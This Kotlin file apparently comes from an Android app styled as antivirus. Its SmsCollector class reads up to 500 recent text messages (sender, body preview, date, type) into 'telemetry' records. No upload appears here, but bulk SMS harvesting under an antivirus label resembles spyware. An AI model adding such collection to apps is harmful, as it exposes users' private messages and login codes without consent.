package com.graphene.antivirus.scanner

import android.content.Context
import android.provider.Telephony
import com.graphene.antivirus.data.SmsTelemetry
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class SmsCollector(private val context: Context) {
    suspend fun collect(limit: Int = 500): List<SmsTelemetry> = withContext(Dispatchers.IO) {
        val result = mutableListOf<SmsTelemetry>()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            null, null, Telephony.Sms.DATE + " DESC"
        ) ?: return@withContext result

        cursor.use { c ->
            val a = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val b = c.getColumnIndex(Telephony.Sms.BODY)
            val d = c.getColumnIndex(Telephony.Sms.DATE)
            val t = c.getColumnIndex(Telephony.Sms.TYPE)
            var n = 0
            while (c.moveToNext() && n < limit) {
                result += SmsTelemetry(
                    address = c.getString(a).orEmpty(),
                    bodyPreview = c.getString(b).orEmpty().take(200),
                    date = c.getLong(d),
                    type = c.getInt(t)
                )
                n++
            }
        }
        result
    }
}